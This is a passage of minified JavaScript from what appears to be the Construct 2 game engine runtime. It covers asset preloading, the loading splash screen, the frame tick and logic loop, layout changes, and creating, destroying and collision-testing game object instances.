            var W = new cr.layout(this, a);
            cr.seal(W), this.layouts[W.name] = W, this.layouts_by_index.push(W)
        }
        for (e = 0, i = f[6].length; e < i; e++) {
            a = f[6][e];
            var U = new cr.eventsheet(this, a);
            cr.seal(U), this.eventsheets[U.name] = U, this.eventsheets_by_index.push(U)
        }
        for (e = 0, i = this.eventsheets_by_index.length; e < i; e++) this.eventsheets_by_index[e].postInit();
        for (e = 0, i = this.eventsheets_by_index.length; e < i; e++) this.eventsheets_by_index[e].updateDeepIncludes();
        for (e = 0, i = this.triggers_to_postinit.length; e < i; e++) this.triggers_to_postinit[e].postInit();
        cr.clearArray(this.triggers_to_postinit), this.audio_to_preload = f[7], this.files_subfolder = f[8], this.pixel_rounding = f[9], this.aspect_scale = 1, this.enableWebGL = f[13], this.linearSampling = f[14], this.clearBackground = f[15], this.versionstr = f[16], this.useHighDpi = f[17], this.orientations = f[20], this.autoLockOrientation = this.orientations > 0, this.pauseOnBlur = f[22], this.wantFullscreenScalingQuality = f[23], this.fullscreenScalingQuality = this.wantFullscreenScalingQuality, this.downscalingQuality = f[24], this.preloadSounds = f[25], this.projectName = f[26], this.enableFrontToBack = f[27] && !this.isIE, this.start_time = Date.now(), cr.clearArray(this.objectRefTable), this.initRendererAndLoader()
    };
    var n = !1,
        r = 0,
        s = [];
    e.prototype.queueImageLoad = function (t, e) {
        var i = this,
            n = function () {
                r--, i.maybeLoadNextImages()
            };
        t.addEventListener("load", n), t.addEventListener("error", n), s.push([t, e]), this.maybeLoadNextImages()
    }, e.prototype.maybeLoadNextImages = function () {
        for (var t; s.length && r < 100;) r++, t = s.shift(), this.setImageSrc(t[0], t[1])
    }, e.prototype.waitForImageLoad = function (t, e) {
        t.cocoonLazyLoad = !0, t.onerror = function (e) {
            t.c2error = !0, n = !0, console && console.error
        }, this.isEjecta ? t.src = e : t.src || ("undefined" != typeof XAPKReader ? XAPKReader.get(e, (function (e) {
            t.src = e
        }), (function (e) {
            t.c2error = !0, n = !0, console && console.error
        })) : (t.crossOrigin = "anonymous", this.queueImageLoad(t, e))), this.wait_for_textures.push(t)
    }, e.prototype.findWaitingTexture = function (t) {
        var e, i;
        for (e = 0, i = this.wait_for_textures.length; e < i; e++)
            if (this.wait_for_textures[e].cr_src === t) return this.wait_for_textures[e];
        return null
    };
    var o = 0,
        a = !1;
    e.prototype.getready = function () {
        this.audioInstance && (o = this.audioInstance.setPreloadList(this.audio_to_preload))
    }, e.prototype.areAllTexturesAndSoundsLoaded = function () {
        var t, e, i, n = o,
            r = 0,
            s = 0,
            h = !0;
        for (t = 0, e = this.wait_for_textures.length; t < e; t++) {
            var c = (i = this.wait_for_textures[t]).cr_filesize;
            (!c || c <= 0) && (c = 5e4), n += c, i.src && (i.complete || i.loaded) && !i.c2error ? r += c : h = !1
        }
        return h && this.preloadSounds && this.audioInstance && (a || (this.audioInstance.startPreloads(), a = !0), r += s = this.audioInstance.getPreloadedSize(), s < o && (h = !1)), this.progress = 0 == n ? 1 : r / n, h
    };
    var h = !1;
    e.prototype.go = function () {
        if (this.ctx || this.glwrap) {
            var e = this.ctx || this.overlay_ctx;
            this.overlay_canvas && this.positionOverlayCanvas();
            var i = window.innerWidth,
                r = window.innerHeight;
            this.lastWindowWidth === i && this.lastWindowHeight === r || this.setSize(i, r), this.progress = 0, this.last_progress = -1;
            var s = this;
            if (this.areAllTexturesAndSoundsLoaded() && (4 !== this.loaderstyle || h)) this.go_loading_finished();
            else {
                var o = Date.now() - this.start_time;
                if (e) {
                    var a = this.width,
                        c = this.height,
                        l = this.devicePixelRatio;
                    if (this.loaderstyle < 3 && (this.isCocoonJs || o >= 500 && this.last_progress != this.progress)) {
                        e.clearRect(0, 0, a, c);
                        var u, p = a / 2,
                            d = c / 2,
                            f = 0 === this.loaderstyle && this.loaderlogos.logo.complete,
                            m = 40 * l,
                            g = 0,
                            y = 80 * l;
                        if (f) {
                            var _ = this.loaderlogos.logo;
                            m = (y = _.width * l) / 2, g = (u = _.height * l) / 2, e.drawImage(_, cr.floor(p - m), cr.floor(d - g), y, u)
                        }
                        if (this.loaderstyle <= 1) d += g + (f ? 12 * l : 0), p -= m, p = cr.floor(p) + .5, d = cr.floor(d) + .5, e.fillStyle = n ? "red" : "DodgerBlue", e.fillRect(p, d, Math.floor(y * this.progress), 6 * l), e.strokeStyle = "black", e.strokeRect(p, d, y, 6 * l), e.strokeStyle = "white", e.strokeRect(p - 1 * l, d - 1 * l, y + 2 * l, 8 * l);
                        else if (2 === this.loaderstyle) {
                            e.font = this.isEjecta ? "12pt ArialMT" : "12pt Arial", e.fillStyle = n ? "#f00" : "#999", e.textBaseLine = "middle";
                            var v = Math.round(100 * this.progress) + "%",
                                b = e.measureText ? e.measureText(v) : null,
                                w = b ? b.width : 0;
                            e.fillText(v, p - w / 2, d)
                        }
                        this.last_progress = this.progress
                    } else if (4 === this.loaderstyle) return this.draw_c2_splash_loader(e), void(t ? t((function () {
                        s.go()
                    })) : setTimeout((function () {
                        s.go()
                    }), 16))
                }
                setTimeout((function () {
                    s.go()
                }), this.isCocoonJs ? 10 : 100)
            }
        }
    };
    var c = -1,
        l = "undefined" == typeof cr_is_preview ? 200 : 0,
        u = !0,
        p = !1,
        d = 0,
        f = 0,
        m = "undefined" == typeof cr_is_preview ? 3e3 : 0,
        g = null,
        y = null,
        _ = 0;

    function v(t, e) {
        return e <= 128 ? t[3] : e <= 256 ? t[2] : e <= 512 ? t[1] : t[0]
    }
    e.prototype.draw_c2_splash_loader = function (t) {
        if (!h) {
            for (var e = Math.ceil(this.width), i = Math.ceil(this.height), r = (this.devicePixelRatio, this.loaderlogos.logo), s = this.loaderlogos.powered, o = this.loaderlogos.website, a = 0; a < 4; ++a)
                if (!r[a].complete || !s[a].complete || !o[a].complete) return;
            0 === _ && (c = Date.now());
            var b, w, x = Date.now(),
                S = !1,
                T = t;
            u || p ? (t.clearRect(0, 0, e, i), function (t, e) {
                g && g.width === t && g.height === e || ((g = document.createElement("canvas")).width = t, g.height = e, y = g.getContext("2d"))
            }(e, i), T = y, S = !0, u && 1 === _ && (c = Date.now())) : t.globalAlpha = 1, T.fillStyle = "#333333", T.fillRect(0, 0, e, i), this.cssHeight > 256 ? (w = .25 * (b = cr.clamp(.22 * i, 105, .6 * e)), T.drawImage(v(s, b), .5 * e - b / 2, .2 * i - w / 2, b, w), w = b = Math.min(.395 * i, .95 * e), T.drawImage(v(r, b), .5 * e - b / 2, .485 * i - w / 2, b, w), w = .25 * (b = cr.clamp(.22 * i, 105, .6 * e)), T.drawImage(v(o, b), .5 * e - b / 2, .868 * i - w / 2, b, w), T.fillStyle = "#3C3C3C", b = e, w = Math.max(.005 * i, 2), T.fillRect(0, .8 * i - w / 2, b, w), T.fillStyle = n ? "red" : "#E0FF65", b = e * this.progress, T.fillRect(.5 * e - b / 2, .8 * i - w / 2, b, w)) : (w = b = .55 * i, T.drawImage(v(r, b), .5 * e - b / 2, .45 * i - w / 2, b, w), T.fillStyle = "#3C3C3C", b = e, w = Math.max(.005 * i, 2), T.fillRect(0, .85 * i - w / 2, b, w), T.fillStyle = n ? "red" : "#E0FF65", b = e * this.progress, T.fillRect(.5 * e - b / 2, .85 * i - w / 2, b, w)), S && (u ? t.globalAlpha = 0 === _ ? 0 : Math.min((x - c) / 300, 1) : p && (t.globalAlpha = Math.max(1 - (x - f) / 300, 0)), t.drawImage(g, 0, 0, e, i)), u && x - c >= 300 && _ >= 2 && (u = !1, d = x), !u && x - d >= m && !p && this.progress >= 1 && (p = !0, f = x), (p && x - f >= 300 + l || "undefined" != typeof cr_is_preview && this.progress >= 1 && Date.now() - c < 500) && (h = !0, u = !1, p = !1, g = null, y = null, this.loaderlogos = null), ++_
        }
    }, e.prototype.go_loading_finished = function () {
        var t, e, i;
        if (this.overlay_canvas && (this.canvas.parentNode.removeChild(this.overlay_canvas), this.overlay_ctx = null, this.overlay_canvas = null), this.start_time = Date.now(), this.last_fps_time = cr.performance_now(), this.uses_loader_layout)
            for (t = 0, e = this.types_by_index.length; t < e; t++)(i = this.types_by_index[t]).is_family || i.isOnLoaderLayout || !i.plugin.is_world || (i.onCreate(), cr.seal(i));
        else this.isloading = !1;
        for (t = 0, e = this.layouts_by_index.length; t < e; t++) this.layouts_by_index[t].createGlobalNonWorlds();
        if (this.fullscreen_mode >= 2) {
            var n = this.original_width / this.original_height,
                r = this.width / this.height;
            2 !== this.fullscreen_mode && r > n || 2 === this.fullscreen_mode && r < n ? this.aspect_scale = this.height / this.original_height : this.aspect_scale = this.width / this.original_width
        }
        for (this.first_layout ? this.layouts[this.first_layout].startRunning() : this.layouts_by_index[0].startRunning(), this.uses_loader_layout || (this.loadingprogress = 1, this.trigger(cr.system_object.prototype.cnds.OnLoadFinished, null), window.C2_RegisterSW && window.C2_RegisterSW()), navigator.splashscreen && navigator.splashscreen.hide && navigator.splashscreen.hide(), t = 0, e = this.types_by_index.length; t < e; t++)(i = this.types_by_index[t]).onAppBegin && i.onAppBegin();
        document.hidden || document.webkitHidden || document.mozHidden || document.msHidden ? window.cr_setSuspended(!0) : this.tick(!1), this.isDirectCanvas && AppMobi.webview.execute("onGameReady();")
    }, e.prototype.tick = function (e, i, n) {
        if (this.running_layout) {
            var r = cr.performance_now(),
                s = r;
            if (n || !this.isSuspended || e) {
                e || (t ? this.raf_id = t(this.tickFunc) : this.timeout_id = setTimeout(this.tickFunc, this.isMobile ? 1 : 16));
                var o = i || r,
                    a = this.fullscreen_mode,
                    h = (document.mozFullScreen || document.webkitIsFullScreen || document.fullScreen || !!document.msFullscreenElement) && !this.isCordova;
                if ((h || this.isNodeFullscreen) && this.fullscreen_scaling > 0 && (a = this.fullscreen_scaling), a > 0) {
                    var c = window.innerWidth,
                        l = window.innerHeight;
                    this.lastWindowWidth === c && this.lastWindowHeight === l || this.setSize(c, l)
                }
                if (this.isDomFree || (h ? this.firstInFullscreen || (this.firstInFullscreen = !0) : this.firstInFullscreen ? (this.firstInFullscreen = !1, 0 === this.fullscreen_mode && this.setSize(Math.round(this.oldWidth / this.devicePixelRatio), Math.round(this.oldHeight / this.devicePixelRatio), !0)) : (this.oldWidth = this.width, this.oldHeight = this.height)), this.isloading) {
                    var u = this.areAllTexturesAndSoundsLoaded();
                    this.loadingprogress = this.progress, u && (this.isloading = !1, this.progress = 1, this.trigger(cr.system_object.prototype.cnds.OnLoadFinished, null), window.C2_RegisterSW && window.C2_RegisterSW())
                }
                this.logic(o), !this.redraw && !this.isCocoonJs || this.is_WebGL_context_lost || this.suspendDrawing || e || (this.redraw = !1, this.glwrap ? this.drawGL() : this.draw(), this.snapshotCanvas && (this.canvas && this.canvas.toDataURL && (this.snapshotData = this.canvas.toDataURL(this.snapshotCanvas[0], this.snapshotCanvas[1]), window.cr_onSnapshot && window.cr_onSnapshot(this.snapshotData), this.trigger(cr.system_object.prototype.cnds.OnCanvasSnapshot, null)), this.snapshotCanvas = null)), this.hit_breakpoint || (this.tickcount++, this.tickcount_nosave++, this.execcount++, this.framecount++), this.logictime += cr.performance_now() - s
            }
        }
    }, e.prototype.logic = function (t) {
        var e, i, n, r, s, o, a, h;
        t - this.last_fps_time >= 1e3 && (this.last_fps_time += 1e3, t - this.last_fps_time >= 1e3 && (this.last_fps_time = t), this.fps = this.framecount, this.framecount = 0, this.cpuutilisation = this.logictime, this.logictime = 0);
        var c = 0;
        if (0 !== this.last_tick_time) {
            var l = t - this.last_tick_time;
            l < 0 && (l = 0), c = l / 1e3, this.dt1 = c, this.dt1 > .5 ? this.dt1 = 0 : this.dt1 > 1 / this.minimumFramerate && (this.dt1 = 1 / this.minimumFramerate)
        }
        this.last_tick_time = t, this.dt = this.dt1 * this.timescale, this.kahanTime.add(this.dt), this.wallTime.add(c);
        var u = (document.mozFullScreen || document.webkitIsFullScreen || document.fullScreen || !!document.msFullscreenElement || this.isNodeFullscreen) && !this.isCordova;
        if (this.fullscreen_mode >= 2 || u && this.fullscreen_scaling > 0) {
            var p = this.original_width / this.original_height,
                d = this.width / this.height,
                f = this.fullscreen_mode;
            u && this.fullscreen_scaling > 0 && (f = this.fullscreen_scaling), this.aspect_scale = 2 !== f && d > p || 2 === f && d < p ? this.height / this.original_height : this.width / this.original_width, this.running_layout && (this.running_layout.scrollToX(this.running_layout.scrollX), this.running_layout.scrollToY(this.running_layout.scrollY))
        } else this.aspect_scale = this.isRetina ? this.devicePixelRatio : 1;
        this.ClearDeathRow(), this.isInOnDestroy++, this.system.runWaits(), this.isInOnDestroy--, this.ClearDeathRow(), this.isInOnDestroy++;
        var m = this.objects_to_pretick.valuesRef();
        for (e = 0, i = m.length; e < i; e++) m[e].pretick();
        for (e = 0, i = this.types_by_index.length; e < i; e++)
            if (!(a = this.types_by_index[e]).is_family && (a.behaviors.length || a.families.length))
                for (n = 0, r = a.instances.length; n < r; n++)
                    for (s = 0, o = (g = a.instances[n]).behavior_insts.length; s < o; s++) g.behavior_insts[s].tick();
        for (e = 0, i = this.types_by_index.length; e < i; e++)
            if (!(a = this.types_by_index[e]).is_family && (a.behaviors.length || a.families.length))
                for (n = 0, r = a.instances.length; n < r; n++)
                    for (s = 0, o = (g = a.instances[n]).behavior_insts.length; s < o; s++)(h = g.behavior_insts[s]).posttick && h.posttick();
        for (e = 0, i = (m = this.objects_to_tick.valuesRef()).length; e < i; e++) m[e].tick();
        for (this.isInOnDestroy--, this.handleSaveLoad(), e = 0; this.changelayout && e++ < 10;) this.doChangeLayout(this.changelayout);
        for (e = 0, i = this.eventsheets_by_index.length; e < i; e++) this.eventsheets_by_index[e].hasRun = !1;
        for (this.running_layout.event_sheet && this.running_layout.event_sheet.run(), cr.clearArray(this.registered_collisions), this.layout_first_tick = !1, this.isInOnDestroy++, e = 0, i = this.types_by_index.length; e < i; e++)
            if (!(a = this.types_by_index[e]).is_family && (a.behaviors.length || a.families.length))
                for (n = 0, r = a.instances.length; n < r; n++) {
                    var g;
                    for (s = 0, o = (g = a.instances[n]).behavior_insts.length; s < o; s++)(h = g.behavior_insts[s]).tick2 && h.tick2()
                }
        for (e = 0, i = (m = this.objects_to_tick2.valuesRef()).length; e < i; e++) m[e].tick2();
        this.isInOnDestroy--
    }, e.prototype.onWindowBlur = function () {
        var t, e, i, n, r, s, o, a, h;
        for (t = 0, e = this.types_by_index.length; t < e; t++)
            if (!(o = this.types_by_index[t]).is_family)
                for (i = 0, n = o.instances.length; i < n; i++)
                    if ((a = o.instances[i]).onWindowBlur && a.onWindowBlur(), a.behavior_insts)
                        for (r = 0, s = a.behavior_insts.length; r < s; r++)(h = a.behavior_insts[r]).onWindowBlur && h.onWindowBlur()
    }, e.prototype.doChangeLayout = function (t) {
        var e, i, n, r = this.running_layout;
        if (this.running_layout.stopRunning(), this.glwrap)
            for (e = 0, i = this.types_by_index.length; e < i; e++)(n = this.types_by_index[e]).is_family || !n.unloadTextures || n.global && 0 !== n.instances.length || -1 !== t.initial_types.indexOf(n) || n.unloadTextures();
        r == t && cr.clearArray(this.system.waits), cr.clearArray(this.registered_collisions), this.runLayoutChangeMethods(!0), t.startRunning(), this.runLayoutChangeMethods(!1), this.redraw = !0, this.layout_first_tick = !0, this.ClearDeathRow()
    }, e.prototype.runLayoutChangeMethods = function (t) {
        var e, i, n, r, s, o, a, h, c, l;
        for (e = 0, i = this.behaviors.length; e < i; e++) n = this.behaviors[e], t ? n.onBeforeLayoutChange && n.onBeforeLayoutChange() : n.onLayoutChange && n.onLayoutChange();
        for (e = 0, i = this.types_by_index.length; e < i; e++)
            if ((r = this.types_by_index[e]).global || r.plugin.singleglobal)
                for (s = 0, o = r.instances.length; s < o; s++)
                    if (a = r.instances[s], t ? a.onBeforeLayoutChange && a.onBeforeLayoutChange() : a.onLayoutChange && a.onLayoutChange(), a.behavior_insts)
                        for (h = 0, c = a.behavior_insts.length; h < c; h++) l = a.behavior_insts[h], t ? l.onBeforeLayoutChange && l.onBeforeLayoutChange() : l.onLayoutChange && l.onLayoutChange()
    }, e.prototype.pretickMe = function (t) {
        this.objects_to_pretick.add(t)
    }, e.prototype.unpretickMe = function (t) {
        this.objects_to_pretick.remove(t)
    }, e.prototype.tickMe = function (t) {
        this.objects_to_tick.add(t)
    }, e.prototype.untickMe = function (t) {
        this.objects_to_tick.remove(t)
    }, e.prototype.tick2Me = function (t) {
        this.objects_to_tick2.add(t)
    }, e.prototype.untick2Me = function (t) {
        this.objects_to_tick2.remove(t)
    }, e.prototype.getDt = function (t) {
        return t && -1 !== t.my_timescale ? this.dt1 * t.my_timescale : this.dt
    }, e.prototype.draw = function () {
        this.running_layout.draw(this.ctx), this.isDirectCanvas && this.ctx.present()
    }, e.prototype.drawGL = function () {
        this.enableFrontToBack && (this.earlyz_index = 1, this.running_layout.drawGL_earlyZPass(this.glwrap)), this.running_layout.drawGL(this.glwrap), this.glwrap.present()
    }, e.prototype.addDestroyCallback = function (t) {
        t && this.destroycallbacks.push(t)
    }, e.prototype.removeDestroyCallback = function (t) {
        cr.arrayFindRemove(this.destroycallbacks, t)
    }, e.prototype.getObjectByUID = function (t) {
        var e = t.toString();
        return this.objectsByUid.hasOwnProperty(e) ? this.objectsByUid[e] : null
    };
    var b = [];
    e.prototype.DestroyInstance = function (t) {
        var e, i, n = t.type.name,
            r = null;
        if (this.deathRow.hasOwnProperty(n)) {
            if ((r = this.deathRow[n]).contains(t)) return
        } else r = b.length ? b.pop() : new cr.ObjectSet, this.deathRow[n] = r;
        if (r.add(t), this.hasPendingInstances = !0, t.is_contained)
            for (e = 0, i = t.siblings.length; e < i; e++) this.DestroyInstance(t.siblings[e]);
        this.isInClearDeathRow && r.values_cache.push(t), this.isEndingLayout || (this.isInOnDestroy++, this.trigger(Object.getPrototypeOf(t.type.plugin).cnds.OnDestroyed, t), this.isInOnDestroy--)
    }, e.prototype.ClearDeathRow = function () {
        if (this.hasPendingInstances) {
            var t, e, i, n, r, s;
            for (this.isInClearDeathRow = !0, i = 0, r = this.createRow.length; i < r; ++i)
                for ((e = (t = this.createRow[i]).type).instances.push(t), n = 0, s = e.families.length; n < s; ++n) e.families[n].instances.push(t), e.families[n].stale_iids = !0;
            cr.clearArray(this.createRow), this.IterateDeathRow(), cr.wipe(this.deathRow), this.isInClearDeathRow = !1, this.hasPendingInstances = !1
        }
    }, e.prototype.IterateDeathRow = function () {
        for (var t in this.deathRow) this.deathRow.hasOwnProperty(t) && this.ClearDeathRowForType(this.deathRow[t])
    }, e.prototype.ClearDeathRowForType = function (t) {
        var e, i, n, r, s, o, a, h, c = t.valuesRef(),
            l = c[0].type;
        for (cr.arrayRemoveAllFromObjectSet(l.instances, t), l.stale_iids = !0, 0 === l.instances.length && (l.any_instance_parallaxed = !1), e = 0, i = l.families.length; e < i; ++e) o = l.families[e], cr.arrayRemoveAllFromObjectSet(o.instances, t), o.stale_iids = !0;
        for (e = 0, i = this.system.waits.length; e < i; ++e)
            if ((s = this.system.waits[e]).sols.hasOwnProperty(l.index) && cr.arrayRemoveAllFromObjectSet(s.sols[l.index].insts, t), !l.is_family)
                for (n = 0, r = l.families.length; n < r; ++n) o = l.families[n], s.sols.hasOwnProperty(o.index) && cr.arrayRemoveAllFromObjectSet(s.sols[o.index].insts, t);
        var u, p = c[0].layer;
        if (p) {
            if (p.useRenderCells)
                for (e = 0, i = (a = p.instances).length; e < i; ++e) h = a[e], t.contains(h) && (h.update_bbox(), p.render_grid.update(h, h.rendercells, null), h.rendercells.set(0, 0, -1, -1));
            cr.arrayRemoveAllFromObjectSet(p.instances, t), p.setZIndicesStaleFrom(0)
        }
        for (e = 0; e < c.length; ++e) this.ClearDeathRowForSingleInstance(c[e], l);
        (u = t).clear(), b.push(u), this.redraw = !0
    }, e.prototype.ClearDeathRowForSingleInstance = function (t, e) {
        var i, n, r;
        for (i = 0, n = this.destroycallbacks.length; i < n; ++i) this.destroycallbacks[i](t);
        t.collcells && e.collision_grid.update(t, t.collcells, null);
        var s = t.layer;
        if (s && s.removeFromInstanceList(t, !0), t.behavior_insts)
            for (i = 0, n = t.behavior_insts.length; i < n; ++i)(r = t.behavior_insts[i]).onDestroy && r.onDestroy(), r.behavior.my_instances.remove(t);
        this.objects_to_pretick.remove(t), this.objects_to_tick.remove(t), this.objects_to_tick2.remove(t), t.onDestroy && t.onDestroy(), this.objectsByUid.hasOwnProperty(t.uid.toString()) && delete this.objectsByUid[t.uid.toString()], this.objectcount--, e.deadCache.length < 100 && e.deadCache.push(t)
    }, e.prototype.createInstance = function (t, e, i, n) {
        if (t.is_family) {
            var r = cr.floor(Math.random() * t.members.length);
            return this.createInstance(t.members[r], e, i, n)
        }
        return t.default_instance ? this.createInstanceFromInit(t.default_instance, e, !1, i, n, !1) : null
    };
    var w = [];
    e.prototype.createInstanceFromInit = function (t, e, i, n, r, s) {
        var o, a, h, c, l;
        if (!t) return null;
        var u = this.types_by_index[t[1]],
            p = u.plugin.is_world;
        if (this.isloading && p && !u.isOnLoaderLayout) return null;
        if (p && !this.glwrap && 11 === t[0][11]) return null;
        var d, f = e;
        for (p || (e = null), u.deadCache.length ? ((d = u.deadCache.pop()).recycled = !0, u.plugin.Instance.call(d, u)) : (d = new u.plugin.Instance(u)).recycled = !1, !i || s || this.objectsByUid.hasOwnProperty(t[2].toString()) ? d.uid = this.next_uid++ : d.uid = t[2], this.objectsByUid[d.uid.toString()] = d, d.puid = this.next_puid++, d.iid = u.instances.length, o = 0, a = this.createRow.length; o < a; ++o) this.createRow[o].type === u && d.iid++;
        d.get_iid = cr.inst_get_iid, d.toString = cr.inst_toString;
        var m, g = t[3];
        if (d.recycled) cr.wipe(d.extra);
        else {
            if (d.extra = {}, "undefined" != typeof cr_is_preview)
                for (d.instance_var_names = [], d.instance_var_names.length = g.length, o = 0, a = g.length; o < a; o++) d.instance_var_names[o] = g[o][1];
            d.instance_vars = [], d.instance_vars.length = g.length
        }
        for (o = 0, a = g.length; o < a; o++) d.instance_vars[o] = g[o][0];
        if (p) {
            var y = t[0];
            if (d.x = cr.is_undefined(n) ? y[0] : n, d.y = cr.is_undefined(r) ? y[1] : r, d.z = y[2], d.width = y[3], d.height = y[4], d.depth = y[5], d.angle = y[6], d.opacity = y[7], d.hotspotX = y[8], d.hotspotY = y[9], d.blend_mode = y[10], l = y[11], !this.glwrap && u.effect_types.length && (d.blend_mode = l), d.compositeOp = cr.effectToCompositeOp(d.blend_mode), this.gl && cr.setGLBlend(d, d.blend_mode, this.gl), d.recycled) {
                for (o = 0, a = y[12].length; o < a; o++)
                    for (h = 0, c = y[12][o].length; h < c; h++) d.effect_params[o][h] = y[12][o][h];
                d.bbox.set(0, 0, 0, 0), d.collcells.set(0, 0, -1, -1), d.rendercells.set(0, 0, -1, -1), d.bquad.set_from_rect(d.bbox), cr.clearArray(d.bbox_changed_callbacks)
            } else {
                for (d.effect_params = y[12].slice(0), o = 0, a = d.effect_params.length; o < a; o++) d.effect_params[o] = y[12][o].slice(0);
                d.active_effect_types = [], d.active_effect_flags = [], d.active_effect_flags.length = u.effect_types.length, d.bbox = new cr.rect(0, 0, 0, 0), d.collcells = new cr.rect(0, 0, -1, -1), d.rendercells = new cr.rect(0, 0, -1, -1), d.bquad = new cr.quad, d.bbox_changed_callbacks = [], d.set_bbox_changed = cr.set_bbox_changed, d.add_bbox_changed_callback = cr.add_bbox_changed_callback, d.contains_pt = cr.inst_contains_pt, d.update_bbox = cr.update_bbox, d.update_render_cell = cr.update_render_cell, d.update_collision_cell = cr.update_collision_cell, d.get_zindex = cr.inst_get_zindex
            }
            for (d.tilemap_exists = !1, d.tilemap_width = 0, d.tilemap_height = 0, d.tilemap_data = null, 14 === y.length && (d.tilemap_exists = !0, d.tilemap_width = y[13][0], d.tilemap_height = y[13][1], d.tilemap_data = y[13][2]), o = 0, a = u.effect_types.length; o < a; o++) d.active_effect_flags[o] = !0;
            d.shaders_preserve_opaqueness = !0, d.updateActiveEffects = cr.inst_updateActiveEffects, d.updateActiveEffects(), d.uses_shaders = !!d.active_effect_types.length, d.bbox_changed = !0, d.cell_changed = !0, u.any_cell_changed = !0, d.visible = !0, d.my_timescale = -1, d.layer = e, d.zindex = e.instances.length, d.earlyz_index = 0, void 0 === d.collision_poly && (d.collision_poly = null), d.collisionsEnabled = !0, this.redraw = !0
        }
        for (cr.clearArray(w), o = 0, a = u.families.length; o < a; o++) w.push.apply(w, u.families[o].behaviors);
        if (w.push.apply(w, u.behaviors), d.recycled)
            for (o = 0, a = w.length; o < a; o++) {
                var _ = w[o];
                for ((v = d.behavior_insts[o]).recycled = !0, _.behavior.Instance.call(v, _, d), h = 0, c = (m = t[4][o]).length; h < c; h++) v.properties[h] = m[h];
                v.onCreate(), _.behavior.my_instances.add(d)
            } else
                for (d.behavior_insts = [], o = 0, a = w.length; o < a; o++) {
                    var v;
                    (v = new(_ = w[o]).behavior.Instance(_, d)).recycled = !1, v.properties = t[4][o].slice(0), v.onCreate(), cr.seal(v), d.behavior_insts.push(v), _.behavior.my_instances.add(d)
                }
        if (m = t[5], d.recycled)
            for (o = 0, a = m.length; o < a; o++) d.properties[o] = m[o];
        else d.properties = m.slice(0);
        if (this.createRow.push(d), this.hasPendingInstances = !0, e && (e.appendToInstanceList(d, !0), 1 === e.parallaxX && 1 === e.parallaxY || (u.any_instance_parallaxed = !0)), this.objectcount++, u.is_contained) {
            if (d.is_contained = !0, d.recycled ? cr.clearArray(d.siblings) : d.siblings = [], !i && !s) {
                for (o = 0, a = u.container.length; o < a; o++)
                    if (u.container[o] !== u) {
                        if (!u.container[o].default_instance) return null;
                        d.siblings.push(this.createInstanceFromInit(u.container[o].default_instance, f, !1, p ? d.x : n, p ? d.y : r, !0))
                    } for (o = 0, a = d.siblings.length; o < a; o++)
                    for (d.siblings[o].siblings.push(d), h = 0; h < a; h++) o !== h && d.siblings[o].siblings.push(d.siblings[h])
            }
        } else d.is_contained = !1, d.siblings = null;
        for (d.onCreate(), d.recycled || cr.seal(d), o = 0, a = d.behavior_insts.length; o < a; o++) d.behavior_insts[o].postCreate && d.behavior_insts[o].postCreate();
        return d
    }, e.prototype.getLayerByName = function (t) {
        var e, i;
        for (e = 0, i = this.running_layout.layers.length; e < i; e++) {
            var n = this.running_layout.layers[e];
            if (cr.equals_nocase(n.name, t)) return n
        }
        return null
    }, e.prototype.getLayerByNumber = function (t) {
        return (t = cr.floor(t)) < 0 && (t = 0), t >= this.running_layout.layers.length && (t = this.running_layout.layers.length - 1), this.running_layout.layers[t]
    }, e.prototype.getLayer = function (t) {
        return cr.is_number(t) ? this.getLayerByNumber(t) : this.getLayerByName(t.toString())
    }, e.prototype.clearSol = function (t) {
        var e, i;
        for (e = 0, i = t.length; e < i; e++) t[e].getCurrentSol().select_all = !0
    }, e.prototype.pushCleanSol = function (t) {
        var e, i;
        for (e = 0, i = t.length; e < i; e++) t[e].pushCleanSol()
    }, e.prototype.pushCopySol = function (t) {
        var e, i;
        for (e = 0, i = t.length; e < i; e++) t[e].pushCopySol()
    }, e.prototype.popSol = function (t) {
        var e, i;
        for (e = 0, i = t.length; e < i; e++) t[e].popSol()
    }, e.prototype.updateAllCells = function (t) {
        if (t.any_cell_changed) {
            var e, i, n = t.instances;
            for (e = 0, i = n.length; e < i; ++e) n[e].update_collision_cell();
            var r = this.createRow;
            for (e = 0, i = r.length; e < i; ++e) r[e].type === t && r[e].update_collision_cell();
            t.any_cell_changed = !1
        }
    }, e.prototype.getCollisionCandidates = function (t, e, i, n) {
        var r, s, o, a = !!t && (1 !== t.parallaxX || 1 !== t.parallaxY);
        if (e.is_family)
            for (r = 0, s = e.members.length; r < s; ++r) o = e.members[r], a || o.any_instance_parallaxed ? cr.appendArray(n, o.instances) : (this.updateAllCells(o), o.collision_grid.queryRange(i, n));
        else a || e.any_instance_parallaxed ? cr.appendArray(n, e.instances) : (this.updateAllCells(e), e.collision_grid.queryRange(i, n))
    }, e.prototype.getTypesCollisionCandidates = function (t, e, i, n) {
        var r, s;
        for (r = 0, s = e.length; r < s; ++r) this.getCollisionCandidates(t, e[r], i, n)
    }, e.prototype.getSolidCollisionCandidates = function (t, e, i) {
        var n = this.getSolidBehavior();
        if (!n) return null;
        this.getTypesCollisionCandidates(t, n.my_types, e, i)
    }, e.prototype.getJumpthruCollisionCandidates = function (t, e, i) {
        var n = this.getJumpthruBehavior();
        if (!n) return null;
        this.getTypesCollisionCandidates(t, n.my_types, e, i)
    }, e.prototype.testAndSelectCanvasPointOverlap = function (t, e, i, n) {
        var r, s, o, a, h, c, l, u = t.getCurrentSol(),
            p = this.getCurrentEventStack().current_event.orblock;
        if (u.select_all)
            for (n || (u.select_all = !1, cr.clearArray(u.instances)), r = 0, a = t.instances.length; r < a; r++)
                if ((o = t.instances[r]).update_bbox(), h = o.layer.canvasToLayer(e, i, !0), c = o.layer.canvasToLayer(e, i, !1), o.contains_pt(h, c)) {
                    if (n) return !1;
                    u.instances.push(o)
                } else p && u.else_instances.push(o);
        else {
            for (s = 0, r = 0, a = (l = p ? u.else_instances : u.instances).length; r < a; r++)
                if ((o = l[r]).update_bbox(), h = o.layer.canvasToLayer(e, i, !0), c = o.layer.canvasToLayer(e, i, !1), o.contains_pt(h, c)) {
                    if (n) return !1;
                    p ? u.instances.push(o) : (u.instances[s] = u.instances[r], s++)
                } n || (l.length = s)
        }
        return t.applySolToContainer(), !!n || u.hasObjects()
    }, e.prototype.testOverlap = function (t, e) {
        if (!(t && e && t !== e && t.collisionsEnabled && e.collisionsEnabled)) return !1;
        t.update_bbox(), e.update_bbox();
        var i, n, r, s, o, a, h, c, l, u, p = t.layer,
            d = e.layer;
